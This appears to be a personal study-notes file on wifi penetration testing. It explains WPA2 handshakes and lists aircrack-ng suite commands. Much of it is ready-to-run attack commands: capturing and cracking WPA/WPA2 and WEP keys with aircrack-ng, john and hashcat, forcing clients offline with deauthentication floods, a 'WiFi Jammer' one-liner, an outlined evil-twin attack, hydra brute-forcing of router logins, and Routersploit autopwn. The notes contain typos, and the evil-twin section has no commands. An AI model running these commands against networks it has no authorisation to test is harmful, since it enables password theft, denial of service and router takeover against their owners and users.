Wifi-Pentesting:
===============
Basics:
	IMPORTANT TERMS:
		ACCESS POINT(AP) => Router/Wireless network
		Client => Target/Device connected to wifi
		BSSID => Access Point MAC address
	SSID => "name" of wifi (service set identifier)
	ESSID => A SSID that *may* apply to multiple access points, eg a company office, normally forming a bigger network. For Aircrack they normally refer to the network you're attacking.
	WPA2-PSK => Wifi networks that you connect to by providing a password that's the same for everyone
	WPA2-EAP => Wifi networks that you authenticate to by providing a username and password, which is sent to a RADIUS server.
	RADIUS => A server for authenticating clients, not just for wifi.
	PSK => password
	STA => station => our device
	Probe Request => helps sta find ap
	Beacon:
		Number of beacon frames received. If you don't have a signal strength you can estimate it by the number of beacons: the more beacons, the better the signal quality.packets sent by ap to keep the network synchronized
	WPA2 Authentication:(4 way handshake)
		Previously, the WEP (Wired Equivalent Privacy) standard was used. This was shown to be insecure and can be broken by capturing enough packets to guess the key via statistical methods.
		The 4 way handshake allows the client and the AP to both prove that they know they key, without telling each other. WPA and WPA2 use practically the same authentication method, so the attacks on both are the same.
		The keys for WPA are derived from both the ESSID and the password for the network. The ESSID acts somewhat similar to a salt in that it makes dictionary attacks more difficult. It means that for a given password, the key will still vary for each access point. This means that unless you precompute the dictionary for just that accesspoint, you will need to try passwords until you find the correct one.
		minimum passphrase length => 8
	Modes:
		Monitor Mode
			adapter monitors all the packets recieved without filtering them
Aircrack-ng Suite Guide:
	Tools:
		aircrack-ng
	    airdecap-ng
	    airmon-ng
	    aireplay-ng
	    airodump-ng
	    airtun-ng
	    packetforge-ng
	    airbase-ng
	    airdecloak-ng
	    airolib-ng
	    airserv-ng
	    buddy-ng
	    ivstools
	    easside-ng
	    tkiptun-ng
	    wesside-n
	(a)airmon-ng:
		airmon-ng #displays wifi interface
		airmon-ng start/stop <interface name> #to start stop monitor mode
		airmon-ng check kill 
			if any process is using airomon-ng, then it kills them so that we can use it
	(b)airodump-ng: It helps to capture WPA2 handshake
		airodump-ng wlan0mon # it will monitor all networks
		Capturing a WPA(2) HANDSHAKE:(.cap file)
			airodump-ng --bssid <> -c <> -w /root/Desktop/file wlan0mon
				it will now only monitor the Access Point specified (bssid)
			we are waiting for a device to connect to the network, forcing the router to send out the four-way handshake that we need to capture in order to crack the password.It can take a lot of patience to wait for a device to connect, so we are AIREPLAY-NG.(covered later)
			We will know that we have captured the handshake, when "WPA Handshake" will come in the upper right corner
			NOTE:
				If you didn’t receive the “handshake message,” then something went wrong in the process of sending the packets
				You might just be too far away, and all you need to do is move closer.
				The device you’re attempting to deauth might not be set to automatically reconnect, in which case you’ll either have to try another device, or leave airodump on indefinitely until someone or something connects to the network.
		options:
			-w => location where handshake should be saved
			--bssid => MAC of AP
			-c => channel
		fields shown in result
			ENC => encryption used by the wifi network
			RXQ => Quality of the signal, when locked on a channel
			PWR => Signal strength
			DATA => Number of data frames received
			BEACONS => See Basics
	(c)aireplay-ng:
		This tool has 10 different attacks, but we only use it for 1 attack, ie Deauthentication attack
		Deauthenciation Attack:
			It forces device(s) to reconnect by sending deauthentication (deauth) packets to one or more Clients which are currently associated with a particular Access Point, making Client(s) think that it needs to reconnect with the Access Point.
			aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan0mon
				-0 <x> => deauthentication with x number of deauth packets
					if x is 0 => send infinte deauth packets
				-a => MAC of access point
				-c => MAC of client to deauthenticate
					if this is omitted then all clients are deauthenticated
			airepaly-ng --deauth <x> 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan0mon
				--deauth => same as -0 
	(d)aircrack-ng: to crack .cap file to find Wi-Fi password
		aircrack-ng -w /usr/share/wordlists/rockyou.txt file.cap
		flags:
			-b => bssid
			-a => attack method 
				2=WPA method (-a2)
		Using john with aircrack-ng:
			john --stdout --wordlist=wordlist.dic | aircrack-ng -w - -b bssid WPAcrack.cap
		Using hashcat with aircrack-ng:
			Convert .cap to .hccapx:
				using cap2hccapx.bin:(/usr/lib/hashcat-utils/cap2hccapx.bin)
					locate cap2hccapx 
					cap2hccapx.bin hackme.cap hackme.hccapx
				using https://hashcat.net/cap2hccapx/
			Cracking .hccapx:
				hashcat -m 2500 file.hccapx rockyou.txt --force
Wifi Attacks:	
	WPA/WPA2:
		airmon-ng start wlan0
		airodump-ng wlan0mon
		airodump-ng --bssid <Target's BSSID> -c <Target's Channel Number> -w /root/Desktop/file wlan0mon -> wait till u get the WPA Handshake => we get it when we get a bssid in the top right corner of output of this command. If we are not able to get WPA Handshake then we deauth any device connected to the victim's Wi-Fi using:
			aireplay-ng --deauth 10 -a <Router's BSSID> -s <Station's BSSID> wlan0mon
		after this we crack the WPA Handshake (.cap file) using aircrack-ng
		aircrack-ng -w /usr/share/wordlists/rockyou.txt file.cap
	WEP:
		airmon-ng start wlan0
		airodump-ng wlan0mon
		airodump-ng --bssid <> -c <> -w <> wlan0mon => Wait until the beacons number reaches to 25,000
		aircrack-ng -w <> file.cap
	WiFi Jammer:
		aireplay-ng -0 0 -a <Router's BSSID> -s FF:FF:FF:FF:FF:FF wlan0mon
	Evil-Twin Attack:
		we ned two wifi cards for it
		we create a fake wifi network similiar to our victim's network and then, we seuthenciate its users from their wifi, so that, they join our fake network, thus giving us PASSWORD of actual wifi network
		commands:
Router Pentesting:
	bruteforcing:
		hydra -L <> -P <> gateway http-get
	Routersploit:(github)
		use scanners/autopwn => tells exploit
			set target gateway
			run
		use exploit/------ => gives router cmdd
			set target http://gateway
			run